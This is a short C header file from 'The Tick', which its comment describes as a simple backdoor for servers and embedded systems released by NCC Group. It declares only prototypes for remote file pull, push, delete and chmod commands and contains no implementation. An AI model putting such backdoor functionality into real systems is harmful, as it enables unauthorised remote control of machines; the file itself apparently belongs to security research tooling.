/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#ifndef FILE_H
#define FILE_H

#include "common.h"
#include "parser.h"

ssize_t get_free_space(const char *pathname);

void do_file_pull(Parser *p);
void do_file_push(Parser *p);
void do_file_delete(Parser *p);
void do_file_chmod(Parser *p);

#endif /* FILE_H */
